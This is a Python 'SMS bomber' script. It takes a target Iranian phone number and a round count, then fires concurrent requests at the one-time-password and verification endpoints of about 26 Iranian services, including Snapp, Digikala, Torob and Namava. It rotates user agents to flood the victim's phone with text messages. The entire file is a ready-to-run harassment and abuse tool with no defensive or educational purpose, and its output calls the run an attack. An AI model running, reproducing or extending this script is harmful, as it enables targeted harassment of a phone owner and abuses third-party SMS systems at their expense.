import requests
import random
import time
import os
from concurrent.futures import ThreadPoolExecutor

BANNER = """
\033[1;31m
  _ ______   _______  ______    ___   _  __    _  ___   _______  __   __  _______  _______  _______  _______  _______ 
|      | |   _   ||    _ |  |   | | ||  |  | ||   | |       ||  | |  ||       ||  _    ||  _    ||       ||  _    |
|  _    ||  |_|  ||   | ||  |   |_| ||   |_| ||   | |    ___||  |_|  ||_     _|| | |   || | |   ||___    || | |   |
| | |   ||       ||   |_||_ |      _||       ||   | |   | __ |       |  |   |  | | |   || | |   |    |   || | |   |
| |_|   ||       ||    __  ||     |_ |  _    ||   | |   ||  ||       |  |   |  | |_|   || |_|   |    |   || |_|   |
|       ||   _   ||   |  | ||    _  || | |   ||   | |   |_| ||   _   |  |   |  |       ||       |    |   ||       |
|______| |__| |__||___|  |_||___| |_||_|  |__||___| |_______||__| |__|  |___|  |_______||_______|    |___||_______|

                [ sms cafe code ]
\033[0m
"""


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
]

def get_api_map(number):

    return {
        'snapp': ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {'cellphone': '0' + number}),
        'lendo': ('https://api.lendo.ir/api/customer/auth/send-otp', {'mobile': '0' + number}),
        'buskool': ('https://www.buskool.com/send_verification_code', {'phone': '0' + number}),
        'torob': ('https://api.torob.com/v4/user/phone/send-pin', {'phone_number': '0' + number}),
        'drdr': ('https://drdr.ir/api/registerEnrollment/verifyMobile', {'phoneNumber': '0' + number, 'userType': 'PATIENT'}),
        'itoll': ('https://app.itoll.ir/api/v1/auth/login', {'mobile': '0' + number}),
        'telewebion': ('https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', {'code': '98', 'phone': number, 'smsStatus': 'default'}),
        'gap': ('https://core.gap.im/v1/user/add.json', {'mobile': '+98' + number}),
        'caropex': ('https://caropex.com/api/v1/user/login', {'mobile': '0' + number}),
        'hamrahsport': ('https://hamrahsport.com/send-otp', {'cell': number, 'name': 'user', 'agree': '1', 'send_otp': '1', 'otp': ''}),
        'basalam': ('https://auth.basalam.com/otp-request', {'mobile': '0' + number}),
        'arastag': ('https://arastag.ir/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''}),
        'tamimpishro': ('https://www.tamimpishro.com/site/api/v1/user/otp', {'mobile': '0' + number}),
        'fafait': ('https://api2.fafait.net/oauth/check-user', {'id': '0' + number}),
        'fankala': ('https://fankala.com/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''}),
        'khanoumi': ('https://www.khanoumi.com/accounts/sendotp', {'mobile': '0' + number, 'redirectUrl': ''}),
        'dalfak': ('https://www.dalfak.com/api/auth/sendVerificationCode', {'type': 1, 'value': '0' + number}),
        'filmnet': (f'https://filmnet.ir/api-v2/access-token/users/0{number}/otp', None),
        'namava': ('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', {'UserName': '+98' + number}),
        'snappapps': ('https://api.snapp.ir/api/v1/sms/link', {'phone': '0' + number}),
        'doctoreto': ('https://api.doctoreto.com/api/web/patient/v1/accounts/register', {'country_id': 205, 'mobile': number}),
        'digikala': ('https://api.digikala.com/v1/user/authenticate/', {'backUrl': '/', 'username': '0' + number, 'otp_call': 'false'}),
        'okala': ('https://api-react.okala.com/C/CustomerAccount/OTPRegister', {'mobile': '0'+number, 'deviceTypeCode' :0, 'confirmTerms': 'true', 'notRobot': 'false'}),
        'estadaad': ('https://api.estadaad.com/api/v1/auth/send-otp', {'mobile': '0' + number}),
        'tapsell': ('https://api.tapsell.com/v1/auth/otp', {'mobile': '0' + number}),
        'digi-pay': ('https://api.digipay.ir/api/v1/auth/otp', {'mobile': '0' + number}),
    }

def send_single_request(item):
    name, (url, payload) = item
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        if payload:
            response = requests.post(url, data=payload, headers=headers, timeout=4)
        else:
            response = requests.get(url, headers=headers, timeout=4)
        
        if response.status_code == 200:
            print(f"\033[1;32m[+] {name}: Sent!\033[0m")
            return True
        else:
            print(f"\033[1;31m[-] {name}: Failed ({response.status_code})\033[0m")
    except:
        print(f"\033[1;31m[-] {name}: Error!\033[0m")
    return False

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)

    target_number = input("\033[1;32mTarget Number (+98): \033[0m")
    try:
        rounds = int(input("\033[1;32m[?] Enter Number of Rounds: \033[0m"))
    except ValueError:
        print("\033[1;31m[-] Invalid number of rounds!\033[0m")
        return

    api_map = get_api_map(target_number)
    targets = list(api_map.items())

    print(f"\n\033[1;36m[*] Starting HIGH-SPEED SMS Bombing on {target_number} for {rounds} rounds...\033[0m")
    time.sleep(1)

    total_sent = 0
    for r in range(1, rounds + 1):
        print(f"\n\033[1;33m--- Round {r} ---\033[0m")
        

        with ThreadPoolExecutor(max_workers=20) as executor:
            results = list(executor.map(send_single_request, targets))
            total_sent += sum(results)

        time.sleep(0.5)

    print(f"\n\033[1;32m[#] Attack Finished! Total SMS requests sent: {total_sent}\033[0m")

if __name__ == "__main__":
    main()
      
